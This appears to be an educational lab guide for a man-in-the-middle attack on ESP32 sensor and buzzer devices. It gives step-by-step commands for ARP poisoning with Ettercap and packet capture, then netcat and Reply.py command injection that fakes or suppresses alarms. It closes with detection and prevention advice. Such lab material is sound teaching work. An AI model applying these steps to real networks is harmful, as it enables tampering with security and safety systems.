# Complete MITM Attack Setup Guide

## 🎯 Objective

Intercept communication between ESP32 sensor and buzzer to reverse-engineer the protocol and inject commands.

---

## 📋 Prerequisites

- Kali Linux or similar penetration testing distribution
- Wireless adapter connected to target network
- Root/sudo privileges
- Target devices:
  - ESP32 A (Sensor): IP unknown (to be discovered)
  - ESP32 B (Buzzer): IP unknown (to be discovered)

---

## 🔍 Phase 1: Network Reconnaissance

### Step 1: Verify Network Interface

```bash
# List all network interfaces
ifconfig

# Expected output:
# wlan1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
#        inet 192.168.0.105  netmask 255.255.255.0  broadcast 192.168.0.255
```

**Note your interface name** (e.g., `wlan1`, `eth0`, `wlp3s0`)

---

### Step 2: Discover Network Devices

```bash
# Scan the local subnet
sudo netdiscover -i wlan1 -r 192.168.0.0/24
```

**Expected Output:**
```
 Currently scanning: Finished!   |   Screen View: Unique Hosts

 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.0.1     00:1A:2B:3C:4D:5E      1      60  Tenda Technology
 192.168.0.101   AA:BB:CC:DD:EE:01      1      60  Espressif Inc.
 192.168.0.103   AA:BB:CC:DD:EE:02      1      60  Espressif Inc.
 192.168.0.105   FF:FF:FF:FF:FF:FF      1      60  Your Device
```

**Record the target IPs:**
- **Sensor (ESP32 A):** 192.168.0.101
- **Buzzer (ESP32 B):** 192.168.0.103

---

### Step 3: Verify Devices are Active

```bash
# Ping the sensor
ping -c 3 192.168.0.101

# Ping the buzzer
ping -c 3 192.168.0.103
```

**Expected:** Both devices respond with minimal packet loss

---

## 🕵️ Phase 2: Setup ARP Spoofing

### Step 4: Launch Ettercap

```bash
# Launch Ettercap with GUI
sudo ettercap -G
```

**Ettercap GUI opens**

---

### Step 5: Configure Ettercap Interface

**In Ettercap GUI:**

1. Click **"Sniff"** → **"Unified sniffing..."**
2. Select your network interface: `wlan1`
3. Click **OK**

**Status bar shows:** `Starting Unified sniffing...`

---

### Step 6: Scan for Hosts

1. Click **"Hosts"** → **"Scan for hosts"**
2. Wait for scan to complete
3. Click **"Hosts"** → **"Host list"**

**You should see:**
```
IP Address       MAC Address          Description
192.168.0.1      00:1A:2B:3C:4D:5E   Gateway/Router
192.168.0.101    AA:BB:CC:DD:EE:01   ESP32 Sensor
192.168.0.103    AA:BB:CC:DD:EE:02   ESP32 Buzzer
192.168.0.105    Your MAC            Your Device
```

---

### Step 7: Add Targets

**Select Sensor (192.168.0.101):**
1. Click on 192.168.0.101
2. Click **"Add to Target 1"**

**Select Buzzer (192.168.0.103):**
1. Click on 192.168.0.103
2. Click **"Add to Target 2"**

**Verify targets:**
- Click **"Targets"** → **"Current targets"**
- Should show:
  ```
  Target 1:
    192.168.0.101 / AA:BB:CC:DD:EE:01
  
  Target 2:
    192.168.0.103 / AA:BB:CC:DD:EE:02
  ```

---

### Step 8: Execute ARP Poisoning

1. Click **"Mitm"** → **"ARP poisoning..."**
2. ✅ Check **"Sniff remote connections"**
3. Click **OK**

**Status bar shows:** `Starting ARP poisoning...`

**What's Happening:**
```
Before ARP Poisoning:
Sensor ←→ Router ←→ Buzzer

After ARP Poisoning:
Sensor ←→ YOUR MACHINE ←→ Router ←→ YOUR MACHINE ←→ Buzzer
           ↓ (capture)                  ↓ (capture)
```

You are now **"Man in the Middle"** 🎯

---

## 📡 Phase 3: Packet Capture & Analysis

### Step 9: Start Wireshark

```bash
# Launch Wireshark
sudo wireshark
```

---

### Step 10: Begin Capture

1. Select your interface: `wlan1`
2. Click **blue shark fin** icon to start capture
3. Packets start appearing immediately

---

### Step 11: Apply Display Filter

In the filter bar, enter:
```
tcp.port == 80 && (ip.src == 192.168.0.101 || ip.dst == 192.168.0.103)
```

**Purpose:** Only show TCP traffic on port 80 involving our target devices

---

### Step 12: Trigger Sensor Events

**Manually trigger the sensor:**
- Wave hand in front of ultrasonic sensor
- Heat the temperature sensor with your hand
- Wait for automatic temperature readings

---

### Step 13: Analyze Captured Packets

**Look for packets with TCP data payload**

**Example Packet 1: Temperature Reading**

Click on a packet → Right-click → **"Follow TCP Stream"**

**Stream Content:**
```
TEMP:28.5
```

**Analysis:**
- Command: `TEMP`
- Format: `TEMP:XX.X`
- Terminator: Newline (`\n`)
- Direction: Sensor → Buzzer

---

**Example Packet 2: Alarm Trigger**

**Stream Content:**
```
ALARM
```

**Analysis:**
- Command: `ALARM`
- Format: Plain text
- No parameters
- Direction: Sensor → Buzzer

---

**Example Packet 3: Alarm Clear**

**Stream Content:**
```
CLEAR
```

**Analysis:**
- Command: `CLEAR`
- Format: Plain text
- No parameters
- Direction: Sensor → Buzzer (or manual)

---

### Step 14: Document Protocol

**Protocol Specification:**

| Element | Value |
|---------|-------|
| Transport | TCP |
| Port | 80 |
| Encoding | ASCII |
| Terminator | `\n` (0x0A) |
| Encryption | None ❌ |
| Authentication | None ❌ |

**Command Set:**

| Command | Format | Function |
|---------|--------|----------|
| `TEMP` | `TEMP:XX.X\n` | Temperature reading |
| `ALARM` | `ALARM\n` | Trigger buzzer |
| `CLEAR` | `CLEAR\n` | Silence buzzer |

---

## 💉 Phase 4: Command Injection

### Step 15: Test with Netcat

```bash
# Test ALARM command
echo "ALARM" | nc 192.168.0.103 80

# Test CLEAR command
echo "CLEAR" | nc 192.168.0.103 80

# Test fake temperature
echo "TEMP:99.9" | nc 192.168.0.103 80
```

**If successful:** Buzzer responds to commands!

---

### Step 16: Use Reply.py

```bash
# Navigate to tool directory
cd iot-sensor-attack/

# Configure target IP
nano Reply.py
# Set: TARGET_IP = "192.168.0.103"

# Run the tool
python3 Reply.py
```

**Menu appears:**
```
==================================================
  ESP32 IoT Sensor Attack Tool
==================================================

[!] Target Configuration:
    IP: 192.168.0.103
    Port: 80

Available Attacks:
  1. Trigger Alarm
  2. Silence Alarm
  3. Fake Temperature (TEMP>50)
  4. Custom Command
  5. Exit
```

---

### Step 17: Execute Attacks

**Attack 1: False Alarm**
```
[>] Select attack (1-5): 1
[*] Sending command: ALARM
[+] Response: Alarm triggered
```
**Result:** Buzzer sounds even though no real threat

---

**Attack 2: Suppress Real Alarm**

Wait for real motion detection, then:
```
[>] Select attack (1-5): 2
[*] Sending command: CLEAR
[+] Response: Alarm cleared
```
**Result:** Real security alert suppressed

---

**Attack 3: Fake High Temperature**
```
[>] Select attack (1-5): 3
[?] Enter fake temperature (default 60): 85
[*] Sending command: TEMP:85
[+] Response: Temperature updated: 85
```
**Result:** System believes temperature is dangerously high

---

## 🧹 Phase 5: Cleanup

### Step 18: Stop Ettercap

1. In Ettercap GUI: Click **"Mitm"** → **"Stop mitm attack(s)"**
2. Click **"Start"** → **"Stop sniffing"**
3. Close Ettercap

**Network returns to normal**

---

### Step 19: Stop Wireshark

1. Click red **stop** button
2. Save capture if desired: **File → Save As...**
3. Close Wireshark

---

### Step 20: Verify Network Restored

```bash
# Check ARP table is normal
arp -a

# Ping devices to verify connectivity
ping -c 3 192.168.0.101
ping -c 3 192.168.0.103
```

---

## 🛡️ Detection & Prevention

### How to Detect This Attack

**Network Level:**
```bash
# Monitor for ARP spoofing
sudo arpwatch -i wlan1

# Watch for duplicate MAC addresses
watch -n 1 'arp -a'
```

**Device Level:**
- Unexpected alarm states
- Temperature readings while sensor untouched
- Commands received without trigger

---

### How to Prevent This Attack

**1. Use Encryption:**
```arduino
// ESP32 code: Use TLS
WiFiClientSecure client;
client.setCACert(root_ca);
client.connect("192.168.0.103", 443);
```

**2. Add Authentication:**
```arduino
// ESP32 code: Require API key
const char* API_KEY = "secret-key-here";
if (received_key != API_KEY) {
    return; // Reject
}
```

**3. Static ARP Entries:**
```bash
# On each device, set static ARP
arp -s 192.168.0.101 AA:BB:CC:DD:EE:01
arp -s 192.168.0.103 AA:BB:CC:DD:EE:02
```

**4. Network Segmentation:**
- Place IoT devices on separate VLAN
- Restrict communication between VLANs
- Use firewall rules

---

## ⚠️ Troubleshooting

### Problem: Ettercap shows no hosts

**Solution:**
```bash
# Ensure you're on the correct network
ifconfig

# Try command-line scan
sudo nmap -sn 192.168.0.0/24
```

---

### Problem: Wireshark shows no packets

**Solution:**
1. Verify capture is running
2. Check filter syntax
3. Ensure Ettercap ARP poisoning is active
4. Trigger sensor manually to generate traffic

---

### Problem: Commands don't work

**Solution:**
1. Verify target IP is correct
2. Check device is powered on
3. Test with netcat first
4. Ensure port 80 is open:
   ```bash
   sudo nmap -p 80 192.168.0.103
   ```

---

### Problem: Permission denied errors

**Solution:**
```bash
# Run with sudo
sudo ettercap -G
sudo wireshark
sudo python3 Reply.py  # if accessing privileged ports
```

---

## 📊 Success Indicators

✅ **ARP poisoning active:** Ettercap shows "Poisoning..." status  
✅ **Packets captured:** Wireshark displays TCP traffic  
✅ **Commands visible:** Can see cleartext ALARM/CLEAR/TEMP  
✅ **Injection works:** Reply.py receives responses  
✅ **Device responds:** Buzzer activates on command  

---

## 🎓 Learning Outcomes

After completing this guide, you should understand:

- ✓ How ARP spoofing works
- ✓ Man-in-the-Middle attack methodology
- ✓ Network protocol analysis techniques
- ✓ Cleartext communication vulnerabilities
- ✓ Command injection exploitation
- ✓ Defense mechanisms and best practices

---

## ⚖️ Legal Reminder

**This guide is for educational purposes ONLY.**

- ✅ Test on devices you own
- ✅ Use in controlled lab environment
- ✅ Follow responsible disclosure
- ❌ Never attack unauthorized networks
- ❌ Never cause harm or disruption

---

**Next Steps:**
- Try the [Denial of Service attack](denial-of-service.md)
- Explore [Automated attack scripts](command-injection.md)
- Learn about [Protocol analysis techniques](protocol-analysis.md)

---

*Remember: Use these techniques ethically to improve security, not to cause harm.* 🔐